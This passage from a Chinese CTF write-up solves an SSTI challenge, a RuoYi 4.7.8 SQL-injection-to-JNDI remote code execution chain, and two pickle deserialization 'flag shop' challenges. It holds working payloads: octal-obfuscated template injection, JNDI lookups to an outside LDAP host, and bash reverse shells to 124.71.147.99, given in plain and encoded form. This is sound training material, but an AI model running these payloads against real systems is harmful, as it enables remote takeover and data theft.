{{''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\154\163\040\057\042\051\056\162\145\141\144\050\051')}}

```



![image-20240810225935599](https://img-blog.csdnimg.cn/img_convert/2d0bdba004a9d5c7429f0baaeb57e36b.png)

读取flag

```has-numbering
{{''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\143\141\164\040\057\146\061\061\061\061\061\061\061\061\061\061\061\061\061\061\061\064\147\056\164\170\164\042\051\056\162\145\141\144\050\051')}}

```



![image-20240810230026637](https://img-blog.csdnimg.cn/img_convert/0924f6ca3ed233b32a645849f5e25b15.png)

## 没有人比我更懂RuoYi



![image-20240807205532084](https://img-blog.csdnimg.cn/img_convert/39f5bd2a83743e6db2ddf8ee3bec0f66.png)

看题目描述，若依的版本是v4.7.7，屏蔽定时任务bean违规的字符但是没屏蔽干净，造成了漏洞。

尝试了一下4.7.6 版本 任意文件下载漏洞，已经失效了。



![image-20240907020508411](https://img-blog.csdnimg.cn/img_convert/de44912fe99c0936cc2f1c53016802b3.png)

参考文章：

若依4.7.8版本计划任务rce复现_若依计划任务rce-CSDN博客

POC/RuoYi/RUOYI-v4.7.8存在远程代码执行漏洞.md at main · wy876/POC · GitHub

这题有师傅写wp了，写的很好：ruoyi-v4.7.8-RCE分析 - EddieMurphy’s blog (eddiemurphy89.github.io)

开始做题。

==第一步是计划任务sql注入==

先验证一下4.7.8计划任务sql注入

```has-numbering
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'test~' WHERE job_id = 1;')

```



![image-20240907022631963](https://img-blog.csdnimg.cn/img_convert/ef36be7ed0da6fa8a674bc4780f66925.png)

payload中的sql语句以及被执行，作用是修改id为1的计划任务的值为test~。验证成功



![image-20240907022655650](https://img-blog.csdnimg.cn/img_convert/3a16c515d0a901dee58d991774e00e23.png)

==第二步是计划任务命令执行==

开启监听验证漏洞 payload：

```has-numbering
javax.naming.InitialContext.lookup('ldap://124.71.147.99:1717')

```

将上面的payload进行十六进制编码：

```has-numbering
0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3132342E37312E3134372E39393A313731372729

```

将编码后的payload带入下面的payload中：

```has-numbering
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3132342E37312E3134372E39393A313731372729 WHERE job_id = 2;')

```

上面payload的作用是利用之前的sql注入漏洞，修改job_id为2的计划任务内容，将该计划任务执行的命令改为我们构造好的payload。



![image-20240907023130407](https://img-blog.csdnimg.cn/img_convert/6c98133f6d06e934274c9fc9c96c84a4.png)



![image-20240907023202151](https://img-blog.csdnimg.cn/img_convert/3e6ba188a7b285079aa5f82815f32449.png)

更多操作->执行一次id为2的任务，收到监听



![image-20240907023310115](https://img-blog.csdnimg.cn/img_convert/1b53a018da90429e605123e57ae1aae9.png)

rce可行。我们接下来使用JNDI反弹shell。

先下好工具：https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/releases

```has-numbering
java -jar JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuNzEuMTQ3Ljk5LzE3MTcgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 124.71.147.99

```



![image-20240907031217483](https://img-blog.csdnimg.cn/img_convert/715be647438192c8763834e452a5e393.png)

```has-numbering
javax.naming.InitialContext.lookup('ldap://124.71.147.99:1389/remoteExploit8')

```

```has-numbering
0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3132342E37312E3134372E39393A313338392F72656D6F74654578706C6F6974382729

```

```has-numbering
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3132342E37312E3134372E39393A313338392F72656D6F74654578706C6F6974382729 WHERE job_id = 3;')

```



![image-20240907025505515](https://img-blog.csdnimg.cn/img_convert/10c4023c6e0c9b0f4d524d9e447f055d.png)



![image-20240907031120090](https://img-blog.csdnimg.cn/img_convert/a9626a36cd17829115f5b863b4f5238b.png)



![image-20240907031134727](https://img-blog.csdnimg.cn/img_convert/8cff3e3f2f2ef7596f6f85aa93ab58e2.png)

结尾列一下若依的历史漏洞

## CNSS娘のFlag商店



![image-20240809075621948](https://img-blog.csdnimg.cn/img_convert/7e10eb36764fe8af91393c3363ab8543.png)

开题，/code路由下载源码

```prism
NAME = "Rich"
MONEY = 2000

def reset():
    global NAME, MONEY
    NAME = "Rich"
    MONEY = 2000

```

```prism
# encoding: utf-8
import os
import pickle

import buyInfo
import flask

app = flask.Flask(__name__)
flag = os.environ.get('FLAG')


class Hi():
    def __init__(self, name, money):
        self.name = name
        self.money = money

    def __eq__(self, other):
        return self.name == other.name and self.money == other.money


@app.route('/')
def index():
    user = flask.request.args.get('user')
    if user is None:
        return 'View code in /code to buy flag.'
    if 'R' in user.upper():
        return '臭要饭的别挡我财路'

    user = pickle.loads(user.encode('utf-8'))
    print(user.name, user.money)
    print(buyInfo.NAME,  buyInfo.MONEY)
    if user == Hi(buyInfo.NAME,  buyInfo.MONEY):
        buyInfo.reset()
        return f'CNSS娘最喜欢富哥啦，这是你要的flag {flag}'

    return '臭要饭的别挡我财路'


@app.route('/code')
def code():
    file = 'code.zip'
    return flask.send_file(file, mimetype='application/zip')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)


```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

核心代码是这段：

```prism
@app.route('/')
def index():
    user = flask.request.args.get('user')
    if user is None:
        return 'View code in /code to buy flag.'
    if 'R' in user.upper():
        return '臭要饭的别挡我财路'

    user = pickle.loads(user.encode('utf-8'))
    print(user.name, user.money)
    print(buyInfo.NAME,  buyInfo.MONEY)
    if user == Hi(buyInfo.NAME,  buyInfo.MONEY):
        buyInfo.reset()
        return f'CNSS娘最喜欢富哥啦，这是你要的flag {flag}'

    return '臭要饭的别挡我财路'

```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

pickle.loads()函数是漏洞点，pickle反序列化。其实有pickle反序列化直接弹shell就行，但是这里根着题目意思来。

__eq__(self, other)方法在Python中是一个特殊的方法，用于定义当使用等号运算符(==)比较两个类的实例时的行为。

如果你在类中实现了__eq__方法，那么你就告诉Python，应该如何判断两个该类的实例是否相等。默认情况下，如果你没有定义__eq__，两个类的实例只有在它们是内存中同一个对象时（即具有相同的身份）才会被认为是相等的。但是，如果你想根据某些属性来判断两个实例是否相等，就需要定义__eq__方法。

在Hi类中，__eq__方法的定义如下：

```prism
def __eq__(self, other):
    return self.name == other.name and self.money == other.money

```

这个方法用于比较两个Hi类的实例（self和other）。它检查两个实例的name和money属性是否相等。如果它们都相等，则方法返回True，表示这两个实例是相等的。否则，返回False。

举个例子：

```prism
person1 = Hi("Alice", 100)
person2 = Hi("Alice", 100)
person3 = Hi("Bob", 200)

print(person1 == person2)  # 这将打印True，因为name和money属性都相等
print(person1 == person3)  # 这将打印False，因为name或money属性不相等

```

因此，__eq__方法实际上是实现用户在自定义比较Hi类的实例时，实现==运算符的含义。

虽然这题和自助商店一样可以直接打RCE，但是我们还是做一下预期解。

预期解是我们序列化一个对象即可，name、money和buyInfo对象的name、money相等就行，

对象名字任意取，不用R。

可以先看一个test脚本：

```prism
import pickle
import os


class Person():
    def __init__(self):
        self.age = 18
        self.name = "Pickle"

    # def __reduce__(self):
    #     command = r"whoami"
    #     return (os.system, (command,))


p = Person()
opcode = pickle.dumps(p)
print(opcode)

P = pickle.loads(opcode)
print('The age is:' + str(P.age), 'The name is:' + P.name)


```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

if 'R' in user.upper():payload里面不能有R字符，之前有想过不给用R那名字里面的Rich怎么办，后来发现不一定要直接传值。还记得c指令码吗？它专门用来获取一个全局变量。

看0x07：从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势 - 知乎 (zhihu.com)

payload：

```has-numbering
(V\u0052\u0069\u0063\u0068%0aI2000%0ai__main__%0aHi%0a.

(i__main__%0AHi%0A(dS'money'%0AI2000%0AsS'name'%0AcbuyInfo%0ANAME%0Asb.

(i__main__%0AHi%0A(dS'money'%0AcbuyInfo%0AMONEY%0AsS'name'%0AcbuyInfo%0ANAME%0Asb.

```

## CNSS娘の自助Flag商店



![image-20240807205727858](https://img-blog.csdnimg.cn/img_convert/d2755e029bdb83c6f513c8539daff268.png)

/code路由可以拿到源码

```prism
NAME = "Rich"
MONEY = 2000

def reset():
    global NAME, MONEY
    NAME = "Rich"
    MONEY = 2000

```

```prism
# encoding: utf-8
import pickle

import flask
import buyInfo

app = flask.Flask(__name__)
# flag is in /flag.txt


class Hi():
    def __init__(self, name, money):
        self.name = name
        self.money = money

    def __eq__(self, other):
        return self.name == other.name and self.money == other.money


@app.route('/')
def index():
    user = flask.request.args.get('user')
    if user is None:
        return 'View code in /code to buy flag.'
    if 'R' in user.upper():
        return '臭要饭的别挡我财路'

    user = pickle.loads(user.encode('utf-8'))
    if user == Hi(buyInfo.NAME, buyInfo.MONEY):
        buyInfo.reset()
        return '你说得对，但是上次CNSS娘被你骗了之后很伤心，把商店改成了自助flag商店，你得自己找flag'

    return '臭要饭的别挡我财路'


@app.route('/code')
def code():
    file = 'code.zip'
    return flask.send_file(file, mimetype='application/zip')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)

```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

pickle反序列化。if 'R' in user.upper():禁用了R字符。像[2021极客巅峰 opcode]，参考文章：CTF题型 Python中pickle反序列化进阶利用&opcode绕过_ctf opcode-CSDN博客

这个有R被ban了

```has-numbering
cos
system
(S'whoami'
tR.

```

下面两个都可以用

```has-numbering
(S'bash -c 'sh -i >& /dev/tcp/124.71.147.99/1717 0>&1''
ios
system
.

```

```has-numbering
(cos
system
S'bash -c 'sh -i >& /dev/tcp/124.71.147.99/1717 0>&1''
o.

```

payload：（要URL编码一下）

```has-numbering
/?user=(S'bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.71.147.99%2F1717%200%3E%261''%0Aios%0Asystem%0A.

```



![image-20240807211133061](https://img-blog.csdnimg.cn/img_convert/40dec4e0a606d45f68fea7ee9b6c73f5.png)